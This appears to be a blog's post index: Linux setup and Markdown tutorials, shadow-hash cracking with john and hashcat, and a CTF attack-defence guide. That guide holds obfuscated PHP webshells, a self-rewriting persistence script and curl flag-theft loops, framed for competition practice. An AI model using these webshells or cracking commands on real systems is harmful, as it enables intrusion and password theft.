引用资源引用文章的资源。","categories":[],"tags":[{"name":"编程随笔","slug":"编程随笔","permalink":"http://whosurdaddy.cf/tags/编程随笔/"}]},{"title":"manjaro安装及配置","slug":"manjaro","date":"2019-03-17T06:32:10.000Z","updated":"2019-05-05T10:18:30.000Z","comments":true,"path":"2019/03/17/manjaro/","link":"","permalink":"http://whosurdaddy.cf/2019/03/17/manjaro/","excerpt":"一、启动盘准备我使用的是manjaro-KDE-STABLE版本下载链接 ，也可以选择XFCE或者GNOME版本,我选择这个仅仅是因为这个版本界面好看。下载完毕之后使用imageusb下载链接 写入u盘中，然后重启进入BIOS，选择从U盘启动，我的因为是三个硬盘，一个机械硬盘用作资料存储，一个M.2SSD已安装Windows10，一个SATA接口的空的固态硬盘，所以安装到SATA接口SSD上。 二、开始安装进入安装初始界面，选择时区为Asia/Shanghai，语言选择zh_cn，驱动boot选择free，然后此选项上按e，进入编辑，把free更改为intel，这样做是为了避免双显卡的冲突问题，然后按crtl+x保存退出，移到下一项，同样按e进入编辑模式，然后把free更改为intel，按住ctrl+x保存，开始进入图形化安装界面。","text":"一、启动盘准备我使用的是manjaro-KDE-STABLE版本下载链接 ，也可以选择XFCE或者GNOME版本,我选择这个仅仅是因为这个版本界面好看。下载完毕之后使用imageusb下载链接 写入u盘中，然后重启进入BIOS，选择从U盘启动，我的因为是三个硬盘，一个机械硬盘用作资料存储，一个M.2SSD已安装Windows10，一个SATA接口的空的固态硬盘，所以安装到SATA接口SSD上。 二、开始安装进入安装初始界面，选择时区为Asia/Shanghai，语言选择zh_cn，驱动boot选择free，然后此选项上按e，进入编辑，把free更改为intel，这样做是为了避免双显卡的冲突问题，然后按crtl+x保存退出，移到下一项，同样按e进入编辑模式，然后把free更改为intel，按住ctrl+x保存，开始进入图形化安装界面。 三、分区因为我的电脑已经安装了windows，所以需要考虑boot启动的挂在问题。在创建分区的时候，可以按照自己的想法随意分区，对于双系统需要将boot/efi挂载到windows的启动分区中，这样以后就可以随意进行双系统的切换了。 四、安装后的配置安装完毕后，拔掉u盘，进入BIOS，设置启动项为M.2 SSD，然后记得更高UEFI启动项manjaro为第一启动项，重启后即可进入桌面。登录后首先修改显卡硬件配置，不然等会儿重启后无法开机。我先安装了vim。 sudo pacman -S vim 然后修改grub sudo vim /etc/default/grub 在quite后面添加 acpi_osi=! acpi_osi=&apos;Windows 2009&apos; 这样做是在告诉ACPI模块，我是windows7,别闹了，赶紧工作。接着更新grub sudo update-grub","categories":[],"tags":[{"name":"开发环境配置","slug":"开发环境配置","permalink":"http://whosurdaddy.cf/tags/开发环境配置/"}]},{"title":"Linux/Unix OS中password加密及解密方法探究","slug":"Linux-Unix-OS中password加密及解密方法探究","date":"2018-11-04T08:52:43.000Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2018/11/04/Linux-Unix-OS中password加密及解密方法探究/","link":"","permalink":"http://whosurdaddy.cf/2018/11/04/Linux-Unix-OS中password加密及解密方法探究/","excerpt":"Linux账户密码策略在现在的linux和unix系统中，用户的密码都保存在shadow文件中，因为密码关系到系统的安全，所以只有root用户才有读shadow文件的权限。/etc/passwd 1234567➜ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/synczongbao:x:1000:1000:fengzongbao,,,:/home/zongbao:/bin/zsh","text":"Linux账户密码策略在现在的linux和unix系统中，用户的密码都保存在shadow文件中，因为密码关系到系统的安全，所以只有root用户才有读shadow文件的权限。/etc/passwd 1234567➜ cat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/synczongbao:x:1000:1000:fengzongbao,,,:/home/zongbao:/bin/zsh shadow中存放的内容是有着一定的格式的，如下： {username}:{passwd}:{last}:{may}:{must}:{warn}:{expire}:{diasble}:{reserved} /etc/shadow1234567➜ sudo cat /etc/shadow root:!:16398:0:99999:7:::daemon:*:16273:0:99999:7:::bin:*:16273:0:99999:7:::sys:*:16273:0:99999:7:::sync:*:16273:0:99999:7:::zongbao:$6$NOOoCLdzq4JKnxF.$Cdz0/CbZQRjVJ1vfxMJBlloK1wVEa/czY/63WLBqKWFGjtHk2TPfhveu.ErfDF1gV2YahACNQ/UgEwVOT4qkC/:16569:0:99999:7::: 用冒号分割后的具体意义如下： username：用户名 passwd：密码hash last：密码修改距离1970年1月1日的时间 may：密码将被允许修改之前的天数（0 表示“可在任何时间修改”） must : 系统将强制用户修改为新密码之前的天数（1 表示“永远都不能修改”） warn : 密码过期之前，用户将被警告过期的天数（-1 表示“没有警告”） expire : 密码过期之后，系统自动禁用帐户的天数（-1 表示“永远不会禁用”） disable : 该帐户被禁用的天数（-1 表示“该帐户被启用”） reserved : 保留供将来使用 其中，密码hash列，用$符号隔开了几个部分，依次表示： $ 对应的加密算法 $ salt value $ encrypt value 如果密码字符串为*，表示系统用户不能被登入，为!表示用户名被禁用，如果密码字符串为空，表示没有密码，通过passwd -d 用户名 可以清空一个用户的口令。 加密算法数字和所使用的加密算法对应关系：1： MD5 ，（22位）2a: Blowfish, 只在有一部分linux分支中使用的加密方法5: SHA-256 （43位）6: SHA-512 （86位）目前常用的是当id为1时，使用md5加密，id为5，采用SHA256进行加密，id为6采用SHA512进行加密。 参考linux标准的passwd.c源文件，在pw_encrypt函数中可以找到加密方法：123456789101112131415161718192021222324252627char *pw_encrypt (const char *clear, const char *salt)&#123; static char cipher[128]; char *cp; cp = crypt (clear, salt); if (!cp) &#123; perror (\"crypt\"); exit (1); &#125; if (salt &amp;&amp; salt[0] == '$' &amp;&amp; strlen (cp) &lt;= 13) &#123; .......... fprintf (stderr, _(\"crypt method not supported by libcrypt? (%s)\\n\"), method); exit (1); &#125; if (strlen (cp) != 13) return cp; strcpy (cipher, cp); return cipher; &#125; 也就是说加密用明文密码和一个叫salt的东西用crypt（）加密生成密文。再来看看crypt的帮助：http://www.kernel.org/doc/man-pages/online/pages/man3/crypt.3.html可发现原来crypt密文里是由三部分组成的，即：$id$salt$encrypted目前常用的是当id为1时，使用md5加密，id为5，采用SHA256进行加密，id为6采用SHA512进行加密。分析上面的函数，可看出我们的shadow密码中，直接把$id$salt$encrypted 当做salt参数带入进行crypt加密。那好，我们可以写个简短的代码进行试验： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include studio.hint main(int argc, char *argv[])&#123; if(argc &lt; 2) &#123; printf(\"no usrname input\"); return 1; &#125; if (geteuid() != 0) fprintf(stderr, \"must be setuid root\"); struct passwd *pwd; pwd = getpwnam(argv[1]); if(pwd ==NULL) printf(\"no username found.\\n\"); else &#123; printf(\"passwd: %s\\n\", pwd-&gt;pw_passwd); if(strcmp(pwd-&gt;pw_passwd, \"x\") == 0) &#123; printf(\"shadow used.\\n\"); struct spwd *shd= getspnam(argv[1]); if(shd != NULL) &#123; static char crypt_char[80]; strcpy(crypt_char, shd-&gt;sp_pwdp); char salt[13]; int i=0,j=0; while(shd-&gt;sp_pwdp[i]!='\\0')&#123; salt[i]=shd-&gt;sp_pwdp[i]; if(salt[i]=='$')&#123; j++; if(j==3)&#123; salt[i+1]='\\0'; break; &#125; &#125; i++; &#125; if(j&lt;3)perror(\"file error or user cannot use.\"); if(argc==3) printf(\"salt: %s, crypt: %s\\n\", salt, crypt(argv[2], salt)); printf(\"shadowd passwd: %s\\n\", shd-&gt;sp_pwdp); &#125; &#125; &#125; return 0;&#125; 保存后执行 gcc passwd.c -lcrypt -o passwd 编译成功后运行 ./passwd root 123 其中./passwd是生成的命令，root是我们用来测试的账户，123是测试系统中root用户的密码，执行的结果是：1234passwd: xshadow used.salt: $1$Bg1H/4mz$, crypt: $1$Bg1H/4mz$X89TqH7tpi9dX1B9j5YsF.shadowd passwd: $1$Bg1H/4mz$X89TqH7tpi9dX1B9j5YsF.可见，我们得到了和系统shadow文件下相同结果的密文。 salt盐（Salt），在密码学中，是指在散列之前将散列内容（例如：密码）的任意固定位置插入特定的字符串。这个在散列中加入字符串的方式称为“加盐”。其作用是让加盐后的散列结果和没有加盐的结果不相同，在不同的应用情景中，这个处理可以增加额外的安全性。在大部分情况，盐是不需要保密的。盐可以是随机产生的字符串，其插入的位置可以也是随意而定。如果这个散列结果在将来需要进行验证（例如：验证用户输入的密码），则需要将已使用的盐记录下来。 根据我们的运行结果我们可以看到，在root用户的shadow中，他的salt是$1$Bg1H/4mz$我们之前也是用这个salt来进行加密匹配的。但是，问题是：这个salt到底是怎么来的？？ 还是分析标准的passwd.c，在passwd.c中，找到了生成salt的函数：crypt_make_salt 1234567891011121314151617181920212223242526272829303132333435363738394041424344char *crypt_make_salt (const char *meth, void *arg)&#123; static char result[40]; size_t salt_len = 8; const char *method; result[0] = '\\0'; if (NULL != meth) method = meth; else &#123; if ((method = getdef_str (\"ENCRYPT_METHOD\")) == NULL) method = getdef_bool (\"MD5_CRYPT_ENAB\") ? \"MD5\" : \"DES\"; &#125; if (!strcmp (method, \"MD5\")) &#123; MAGNUM(result, '1');#ifdef USE_SHA_CRYPT &#125; else if (!strcmp (method, \"SHA256\")) &#123; MAGNUM(result, '5'); strcat(result, SHA_salt_rounds((int *)arg)); salt_len = SHA_salt_size(); &#125; else if (!strcmp (method, \"SHA512\")) &#123; MAGNUM(result, '6'); strcat(result, SHA_salt_rounds((int *)arg)); salt_len = SHA_salt_size();#endif &#125; else if (0 != strcmp (method, \"DES\")) &#123; fprintf (stderr, _(\"Invalid ENCRYPT_METHOD value: '%s'.\\n\" \"Defaulting to DES.\\n\"), method); result[0] = '\\0'; &#125; assert (sizeof (result) &gt; strlen (result) + salt_len); strncat (result, gensalt (salt_len), sizeof (result) - strlen (result) - 1); return result;&#125; 除了一大段条件判断语句，其实最重要的只有一句gensalt(salt_len)。看看gensalt的定义：1234567891011121314151617static char *gensalt (unsigned int salt_size)&#123; static char salt[32]; salt[0] = '\\0'; assert (salt_size &gt;= MIN_SALT_SIZE &amp;&amp; salt_size &lt;= MAX_SALT_SIZE); seedRNG (); strcat (salt, l64a (random())); do &#123; strcat (salt, l64a (random())); &#125; while (strlen (salt) &lt; salt_size); salt[salt_size] = '\\0'; return salt;&#125;每次改写密码时，都会再随机生成一个这样的salt。而用户登入时，会拿用户登入的明文密码经过上述演示的步骤生成密文后和shadow里的密码域进行比较。 密文安全性要用到SHA256或者SHA512的密码加密，glic版本需大于2.7。这样的密码还安全吗？答案不是绝对的，如果有不怀好意的人拿到了比如说上面的hash还是可以用字典暴力破解。 破解用户密码hash的常用工具和方法由于Linux的密码加密使用了Salt,所以无法使用彩虹表的方式进行破解,常用的方法为字典破解和暴力破解字典破解和暴力破解的常用工具： 1、 John the Ripper(1) 字典破解Kali2.0集成了John the Ripper字典文件位于/usr/share/john/password.lst使用Kali Linux上的John自带的密码列表。路径为/usr/share/john/password.lst使用字典破解： john –wordlist=/usr/share/john/password.lst ./shadow (2) 暴力破解： john ./shadow 列出已破解的明文密码： john –show ./shadow 结果如下图: 2、 hashcatKali2.0集成了hashcat字典文件使用/usr/share/john/password.lst修改hash格式：只保留$salt$encryptedeg.原hash： test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7::: 修改后： $6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0 (1) 字典破解： hashcat -m 1800 -o found1.txt –remove shadow /usr/share/john/password.lst 参数说明：-m：hash-type，1800对应SHA-512 详细参数可查表：https://hashcat.net/wiki/doku.php?id=example_hashes-o：输出文件–remove：表示hash被破解后将从hash文件移除shadow：代表hash文件/usr/share/john/password.lst：代表字典文件 成功破解出2个hash，如下图: (2) 暴力破解： hashcat -m 1800 -a 3 -o found2.txt shadow ?l?l?l?l –force 参数说明：-a：attack-mode，默认为0，3代表Brute-force，即暴力破解?l：表示小写字母，即abcdefghijklmnopqrstuvwxyz，4个?l代表暴力破解的长度为4?u：表示大写字母，即ABCDEFGHIJKLMNOPQRSTUVWXYZ?h：代表十六进制字符小写，即0123456789?H：代表十六进制字符大写，即0123456789abcdef?s：表示特殊符号，即!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~?a：表示所有字符，即?l?u?d?s?b：表示十六进制，即0x00 - 0xff成功暴力破解出hash，结果如下图: 参考链接 [关于Linux系统中的密码加密流程及原理] Linux 账户密码策略 [盐_(密码学)]","categories":[],"tags":[{"name":"现代密码学","slug":"现代密码学","permalink":"http://whosurdaddy.cf/tags/现代密码学/"}]},{"title":"CTF之AWD攻防","slug":"CTF之AWD攻防","date":"2018-10-20T08:17:45.000Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2018/10/20/CTF之AWD攻防/","link":"","permalink":"http://whosurdaddy.cf/2018/10/20/CTF之AWD攻防/","excerpt":"一张常规的CTF线下攻防思维导图 SSh登录两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。 tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如bak。 依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个bak目录，打开发现是phpmyadmin，提示的弱口令是在这里用上。","text":"一张常规的CTF线下攻防思维导图 SSh登录两三个人进行分工，一个粗略的看下web，有登陆口的话，就需要修改密码，将情况反馈给队友，让登陆ssh的小伙伴进行密码的修改，改成炒鸡复杂、然后将Web目录下载下来，上WAF、文件监控、端口扫描。将这几个工作分工好，顺序就像图上。 tips：将下载下来的Web目录理一遍，看是否有可疑的文件夹，比如bak。 依然记得有次比赛，有两台靶机，赛组提示弱口令。然后每一支队伍都奔着后台去了，结果有队伍在Web目录下发现了这个bak目录，打开发现是phpmyadmin，提示的弱口令是在这里用上。 网络拓扑首先先理清好网络拓扑关系，节点与各链路之间的关联。这个需要下一步配合，要不然不知道对手在哪就GG。 示例： 主机发现如果是在同个C段，或者B段，均可以使用RouterScan进行对80端口扫描进行扫描得出，嫌麻烦的话，就用httpscan这个小巧的脚本 千万要记得扫端口，这很重要。用nmap也行，自己写的脚本或者网上找的也行。 预留后门有的比赛环境，为了照顾比较菜的选手（此处举手），预留了一句话后门。将整个web目录下载到本地，使用hm.exe、D盾或者别的扫描工具可以扫描得出（如果预留） 黑盒测试防御及修复建议 1.将所有的登陆口密码进行修改（炒鸡复杂）； 2.将上传页面的action地址修改为*，（机智小能手！！）； 3.反序列化和命令执行，就去seebug或其他的站点找补丁； 4.待补充… 一句话控制用的一句话木马，最好是需要菜刀配置的，这样做是为了不让别人轻易的利用你的一句话，要不然就只能等着别人用你的脚本捡分。 简单举例： 1&lt;?php ($_=@$_GET[2]).@$_($_POST[1]);?&gt; 连接方式：php?2=assert密码是1。 献上我常用得一句话 12345678&lt;?php $a=chr(96^5); $b=chr(57^79); $c=chr(15^110); $d=chr(58^86); $e='($_REQUEST[C])'; @assert($a.$b.$c.$d.$e);?&gt; 配置为?b=))99(rhC(tseuqeR+lave 123&lt;?php $sF=\"PCT4BA6ODSE_\";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;['n985de9'];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt; 配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs= 连接密码:0（零） 权限维持1234567891011&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.demo.php'; $shell = \"&lt;?php phpinfo();?&gt;\"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; tips:.demo.php前面使用一个点，能很好的隐藏文件。 想要结束这个进程，除了最暴力的重启服务之外，更为优雅的如下: 1234567&lt;?phpwhile (1) &#123; $pid=1234; @unlink('demo.php'); exec('kill -9 $pid');&#125;?&gt; 先查看进程，查看对应的pid，再执行即可。 Flag获取上面的$shell内容看个人，线下赛可以直接使用&lt;?php echo system(&quot;crul 10.0.0.2&quot;); ?&gt;之类的，只是说一个点，剩余的发挥空间由你们思考。 最好能写一个批量上传的，结合批量访问。批量访问参考PHP-定时任务 或者 1234567#!/bin/bashwhile truedo flag=$(curl 'http://172.16.4.42:800') curl --cookie \"PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD\" --data \"key=\"$&#123;flag&#125; \"http://172.16.4.42/index.php/wargame/submit\" sleep 1sdone 日志分析日志分析的用途 感知可能正在发生的攻击，从而规避存在的安全风险 应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失 记录log脚本12345678910111213&lt;?php date_default_timezone_set('Asia/Shanghai'); $ip = $_SERVER[\"REMOTE_ADDR\"]; //记录访问者的ip $filename = $_SERVER['PHP_SELF']; //访问者要访问的文件名 $parameter = $_SERVER[\"QUERY_STRING\"]; //访问者要请求的参数 $time = date('Y-m-d H:i:s',time()); //访问时间 $logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter.\"\\r\\n\"; // log记录 $fh = fopen(\"log.txt\", \"a\"); fwrite($fh, $logadd); fclose($fh);?&gt; 日志分析工具 LogForensics 腾讯实验室 https://security.tencent.com/index.php/opensource/detail/15 北风飘然@金乌网络安全实验室 http://www.freebuf.com/sectool/126698.html 网络ID为piaox的安全从业人员： http://www.freebuf.com/sectool/110644.html 网络ID：SecSky http://www.freebuf.com/sectool/8982.html 网络ID：鬼魅羊羔 http://www.freebuf.com/articles/web/96675.html","categories":[],"tags":[]},{"title":"咸鱼的信安之路","slug":"咸鱼的信安之路","date":"2018-09-19T14:37:20.000Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2018/09/19/咸鱼的信安之路/","link":"","permalink":"http://whosurdaddy.cf/2018/09/19/咸鱼的信安之路/","excerpt":"前言第一次接触到这个领域还是在某次新闻上看到的，说某个人用ATM的漏洞去了多少钱，当时想这个人好NB，我也好想这种将所有东西玩弄于股掌之间的感觉，后来自己上网搜各种资料，大概是高二的时候找了个师傅，教了我一些基本的日站的技巧，不过貌似几个月后，在他日了广州图书馆之后没几天，他就被请去喝茶了，然后就没了消息。。。后来高中毕业了，想着选一个和自己兴趣相近的专业，然后就看到了信息安全，当时感觉新鲜，就试着填报了。结果自然是被录取了，也算是合自己的心意了。","text":"前言第一次接触到这个领域还是在某次新闻上看到的，说某个人用ATM的漏洞去了多少钱，当时想这个人好NB，我也好想这种将所有东西玩弄于股掌之间的感觉，后来自己上网搜各种资料，大概是高二的时候找了个师傅，教了我一些基本的日站的技巧，不过貌似几个月后，在他日了广州图书馆之后没几天，他就被请去喝茶了，然后就没了消息。。。后来高中毕业了，想着选一个和自己兴趣相近的专业，然后就看到了信息安全，当时感觉新鲜，就试着填报了。结果自然是被录取了，也算是合自己的心意了。 开始的时候按照学校的课程安排，重复的上课，下课，感觉业没啥意思。某天听闻学长拿了“蓝盾杯”二等奖，开始对网络攻防赛感兴趣，问了学长该怎么学习相关的知识，然后给了我几个网址，让我有空就到上面去练练手。一开始也觉得挺有趣，就直接登上去做题，做着做着发现自己的知识储备不够，没办法，只能退出来，好好的充充电，后来自己慢慢的找一些书来看，渐渐的自己就摸索出了适合自己的方法，虽说技术还是很垃圾，和以前相比总归有点进步。 WEB做这种题我的感觉是先看例题，现在网络上的资源很多，一些基础的能很方便的找到，比如sql注入，xss，还有其他的web应用漏洞等等，等熟悉了基本的原理，这时候就可以自己搭建一个环境来练手，虽说网上有很多实验环境，但是总是没有比本地更加全面具体，这里推荐的环境有dvwa，sqli—labs等等，以后总是需要自己搭建各种环境的，不如现在练练手也好。 MISC这类的话，我只能说多做题，多开发脑洞，越大越好，还有就是找各种稀奇古怪的题来做。做多了，其实你会发现这种题一般都是套路了，在这儿我推荐一本书，感觉对新手还不错，《数据隐藏技术揭秘 破解多媒体、操作系统、移动设备和网络协议中的隐秘数据》。想练手的也可以去实验吧去找找题做一做，那上面的题大部分还是不错的。 逆向这类的题我一般都是在实验吧上面找的，我对这个不是太在行，目前还处于起步阶段，大部分只是来源还是书籍和网络资源，最多还属看别人各种博客。 PWN这个对某些人属于挑战自我的题目，做出来之后会有很强的满足感，大部分还是网络资源比较多，看雪学院的应该是比较优秀的论坛了，我的大部分PWN的只是都是从那里学来的。 目前来看，网络安全攻防赛不出意外也就从上面这些题目中延伸，如果是企业赛的话，会考虑到服务器的安全配置，应用程序的安全配置，基本上都是以一个漏洞百出的网站为基础。在比赛中攻击和防御都会考察，但是不知防，何来攻，这也是目前我需要掌握的，还需努力啊。 PS：文章中提到的一些网站或者练手站点，我会另写一篇介绍。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://whosurdaddy.cf/tags/随笔/"}]},{"title":"Android studio+SDK环境搭建指南","slug":"Android-studio-SDK环境搭建指南","date":"2018-09-02T13:15:57.000Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2018/09/02/Android-studio-SDK环境搭建指南/","link":"","permalink":"http://whosurdaddy.cf/2018/09/02/Android-studio-SDK环境搭建指南/","excerpt":"系统版本：Windows 10 1709 64bitAndroid Studio版本：3.1.4 0x00 注意！！！校园网有毒，最好使用热点！！！某个问题让我纠结了两天，网上各种方法都试了，最后换了个网络就好了。。。mmp 1. JDK安装Android开发工具要求必须安装 JDK(JavaDevelopment Kit)，不能只安装JRE(Java Runtime Edition)，因为这是Android Device Monitor 所需要的。在安装Android开发工具之前需要先安装Java JDK。尤其是AS的开发过程必须要JDK或者JRE的支持，否则在启动AS的时候就会报错。","text":"系统版本：Windows 10 1709 64bitAndroid Studio版本：3.1.4 0x00 注意！！！校园网有毒，最好使用热点！！！某个问题让我纠结了两天，网上各种方法都试了，最后换了个网络就好了。。。mmp 1. JDK安装Android开发工具要求必须安装 JDK(JavaDevelopment Kit)，不能只安装JRE(Java Runtime Edition)，因为这是Android Device Monitor 所需要的。在安装Android开发工具之前需要先安装Java JDK。尤其是AS的开发过程必须要JDK或者JRE的支持，否则在启动AS的时候就会报错。 JDK下载首先到Java官网下载，我使用的是jdk1.8.0_181 勾选Accept License Agreement，然后下载对应版本的JDK下载好后安装 注意记下路径，以后会用到，可以自己选择 JDK安装完成后会显示安装JRE，自己选择路径安装 安装完成后单击关闭，接下来配置环境变量。 2. 配置环境变量桌面-&gt;右键”此电脑”-&gt;属性-&gt;高级系统设置-&gt;环境变量，在系统变量中找到PATH，单击编辑，选择新建，将%Java安装目录%/bin和Java安装目录/jre/bin两个路径填进去验证安装是否成功，打开命令行窗口，在命令提示符下执行javac -version 。如果安装成功，就会看到Oracle JDK版本号。至此，基础环境搭建完毕，下面正式安装Android Studio搭建环境。 3. Android Studio下载和安装首先，在这个网站下载安装包，推荐最新的正式版，记得用浏览器自带的下载器或者使用FDM，使用迅雷会出现死链。（无法下载的可以找我要安装包）下载完毕后双击安装，根据向导完成安装。此时可以点击cancel，按照默认配置安装SDK，我选择关闭窗口，自己安装SDK，这样可以更改SDK安装目录（因为SDK所需空间较大，默认是在C盘）。 4. SDK下载与安装首先在这个网站下载SDk安装包，推荐下载压缩包，解压后即可使用。打开SDK的解压目录，双击SDK manager.exe等待一段时间后会出现下载列表，勾选你想要下载的tools，点击install packages，然后选择 同意条款即可下载。 Android SDK Tools和Android SDK Platform-tools是必须要下载的。 若在更新下载列表时报错，或出现dl.google.com拒绝连接，请关闭代理，并清空缓存Tools-&gt;options-&gt;clear cache，然后重启SDK manager。下载解压完成后添加两项环境变量：%你的SDK安装目录%/platform-tools和%你的SDK安装目录%/tools。 5. 开始使用AS上述步骤完成后，即可打开AS。若打开后显示如下：请在%AS安装目录%/bin下的idea.properties文件中添加如下一句话：disable.android.first.run=true此时可按照自己的喜好创建一个空白的工程。 未完待续…","categories":[],"tags":[{"name":"编程随笔","slug":"编程随笔","permalink":"http://whosurdaddy.cf/tags/编程随笔/"}]},{"title":"Markdown的简单世界（二）","slug":"Markdown的简单世界（二）","date":"2018-08-29T10:02:42.000Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2018/08/29/Markdown的简单世界（二）/","link":"","permalink":"http://whosurdaddy.cf/2018/08/29/Markdown的简单世界（二）/","excerpt":"段落一行文字就是一个段落比如这是一个段落。会被解释成为 &lt;p&gt;这是一个段落。&lt;/p&gt;","text":"段落一行文字就是一个段落比如这是一个段落。会被解释成为 &lt;p&gt;这是一个段落。&lt;/p&gt; 若需要另起一段，直接在两个段落之间空一行即可。也可以在第一个段落之后空两个，然后换行即可。 这是一个段落。 这是另一个段落。 会被解释成 &lt;p&gt;这是一个段落。&lt;/p&gt;&lt;p&gt;这是另一个段落。&lt;/p&gt; 在hexo中，直接换行等同于键入空格，所以需要打两个空格 粗体和斜体可以使用 * 或 _ 指定斜体或粗体。 这是斜体这也是斜体这是粗体这是粗体+斜体` 以上会被对应解释为 &lt;em&gt;这是斜体&lt;/em&gt;&lt;em&gt;这也是斜体&lt;/em&gt;&lt;strong&gt;这是粗体&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;这是粗体+斜体&lt;/strong&gt;&lt;/em&gt; 快捷键 ctrl+B加粗 ctrl+I斜体 标题markdown总共支持六级标题，通过在一行之前加上不同数量的 # 号来表示。行尾可以加上任意数量的井号字符，这些字符不会算作标题内容。通常会加上相等数量的字符以保持对称。此外，H1和H2也可以采用在文本下方添加底线来实现，比如 这是H1 这是H2引用通过在行首加上 &gt; 来添加引用格式。 this is the test. 引用可以嵌套： test1 test2 也可以嵌套其他格式: ##这是一个标题 这是第一行。 这是第二行。 列表无序列表可以使用星号 *、加号+或者减号-作为标记： red green blue 等同于 red green blue 或 red green blue 有序列表可以使用数字接着一个半角点： red green blue 数字并不影响html的输出结果。 内联代码用反引号 ` 来标记内联代码，它们会解释成&lt;code&gt;标签。如果代码的内容中有反引号，请用两个反引号包裹。代码中的&amp;、&lt;、&gt;符号都会自动转义，请放心使用。 代码区域有两种标记代码的区域，原生风格时行首缩进四个空格。还有一种是github风格，代码的前后用三个反引号独占一行来标记。 这是一个代码区块 分割线你可以在一行中用三个以上的星号 * 、减号 - 、底线 _ 来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。 链接 [an example](http://example.com/)[an example](http://example.com/ &quot;Optional Title&quot;) 会被解释为 &lt;a href=&#39;http://example.com/&#39;&gt;an example&lt;/a&gt;&lt;a href=&#39;http://example.com/&#39; title=&quot;Optional Title&quot;&gt;an example&lt;/a&gt; 处行内式之外，也可以使用参考式： [an example][id] 然后在任意空白处位置定义： [id]: http://example.com/ &quot;Optional Title&quot; 图像 ![Alt text](/path/to/img.jpg)![Alt text](/path/to/img.jpg &quot;Optional Title&quot;) 会被解释为： &lt;img src=&#39;/path/to/img.jpg&#39; alt=&#39;Alt text&#39; /&gt;&lt;img src=&#39;/path/to/img.jpg&#39; alt=&#39;Alt text&#39; title=&#39;Optional Title&#39; /&gt; 同样，图像也有同链接类似的参考式语法。 自动链接如果链接的地址和名字重复，可以用尖括号语法将其简化。 &lt;http://example.com/&gt; 就相当于 [http://example.com/](http://example.com/) 大多数编辑器都会自动将符合url规则的东西视为链接，并且解释成链接。很多时候作者由于疏忽等缘故，链接和后面的中文之间缺少空格，导致链接不正常。所以我建议，链接要么加上尖括号，要么两端加上空格。 转义markdown支持在以下字符前面插入反斜杠 \\ 反斜线` 反引号* 星号_ 底线{} 花括号[] 方括号() 括弧# 井字号+ 加号- 减号. 英文句点! 惊叹号 插入之后，将不再解析这些字符，而是原样输出。 表格 | Item | Value | Qty || :------- | ----: | :---: || Computer | $1600 | 5 || Phone | $12 | 12 || Pipe | $1 | 234 | Item Value Qty Computer $1600 5 Phone $12 12 Pipe $1 234 要注意第二行的冒号决定了居左居右还是居中，如果你不加冒号，默认是居左的。 另外可以把第一行去掉，做成没有表头的表格，但第二行始终是要有的。 内联HTMLmarkdown 的语法简洁，但有其局限性，所以特意保留了内联html这种方式。任何html标签及其内容，都会原样输出到结果中。也就是说，标签中的星号等作为markdown结构的符号，以及构成html标签和实体的符号，都不会做任何转义。","categories":[],"tags":[{"name":"编程随笔","slug":"编程随笔","permalink":"http://whosurdaddy.cf/tags/编程随笔/"}]},{"title":"Markdown的简单世界（一）","slug":"Markdown的简单世界（一）","date":"2018-08-28T13:07:17.000Z","updated":"2019-03-17T04:25:23.000Z","comments":true,"path":"2018/08/28/Markdown的简单世界（一）/","link":"","permalink":"http://whosurdaddy.cf/2018/08/28/Markdown的简单世界（一）/","excerpt":"Markdown的简介 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。","text":"Markdown的简介 Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。 Markdown具有一系列衍生版本，用于扩展Markdown的功能（如表格、脚注、内嵌HTML等等），这些功能原初的Markdown尚不具备，它们能让Markdown转换成更多的格式，例如LaTeX，Docbook。Markdown增强版中比较有名的有Markdown Extra、MultiMarkdown、 